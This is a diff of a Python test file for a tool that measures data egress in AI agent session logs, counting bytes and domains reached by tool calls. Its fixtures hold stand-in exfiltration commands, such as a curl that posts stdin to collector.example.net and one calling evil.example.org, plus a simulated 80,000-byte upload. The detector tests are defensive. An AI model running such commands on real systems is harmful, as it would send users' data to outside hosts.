@@ -391,6 +391,8 @@ def test_the_check_reads_what_the_parsers_record(tmp_path, baseline):
     record = {"type": "assistant", "message": {"role": "assistant", "content": [
         {"type": "tool_use", "id": "t1", "name": "WebFetch",
          "input": {"url": f"https://{HOST}/v1/upload", "body": "A" * 80_000}}]}}
+    # "body" is a content key, so no destination is read from it — and the size
+    # of the arguments still counts every byte of it.
     (proj / "s.jsonl").write_text(json.dumps(record) + "\n", encoding="utf-8")
     g = ClaudeCodeParser().parse(str(proj / "s.jsonl"))
     assert g.egress_bytes[HOST] > 80_000 and g.egress_calls[HOST] == 1
@@ -485,7 +487,7 @@ def test_a_host_past_the_padding_limit_is_found():
 
 @pytest.mark.parametrize("payload,reason", [
     ({"command": "; ".join(f"curl d{i}.example.net/x" for i in range(MAX_DOMAINS + 5))}, "domains"),
-    ({"body": [f"https://h{i}.example.net/" for i in range(MAX_DOMAINS + 5)]}, "domains"),
+    ({"urls": [f"https://h{i}.example.net/" for i in range(MAX_DOMAINS + 5)]}, "domains"),
     ({"url": "https://a.example/", "command": "echo " + "A" * (MAX_STRING_CHARS + 10)}, "string"),
 ])
 def test_a_limit_that_cuts_a_scan_short_is_reported(payload, reason):
@@ -496,7 +498,7 @@ def test_a_limit_that_cuts_a_scan_short_is_reported(payload, reason):
 
 def test_the_cap_applies_to_the_arguments_and_the_result_together():
     """A call whose arguments and redirects together pass the cap says so."""
-    args = {"body": [f"https://a{i}.example.net/" for i in range(MAX_DOMAINS - 2)]}
+    args = {"urls": [f"https://a{i}.example.net/" for i in range(MAX_DOMAINS - 2)]}
     result = " ".join(f"https://r{i}.example.net/" for i in range(10))
     egress = measure_call(args, result)
     assert len(egress.domains) == MAX_DOMAINS and "domains" in egress.truncated
@@ -520,7 +522,7 @@ def test_an_ordinary_call_is_never_reported_as_truncated():
     for payload in ({"url": "https://api.example.com/v1", "model": "x"},
                     {"command": "curl -sS -d @- collector.example.net/drop"},
                     {"command": "echo " + "A" * 70_000 + "; curl evil.example.org/x"},
-                    {"body": {"deep": {"nested": {"text": "see http://deep.example/z"}}}}):
+                    {"payload": {"deep": {"nested": {"uri": "see http://deep.example/z"}}}}):
         assert measure_call(payload).truncated == ()
 
 
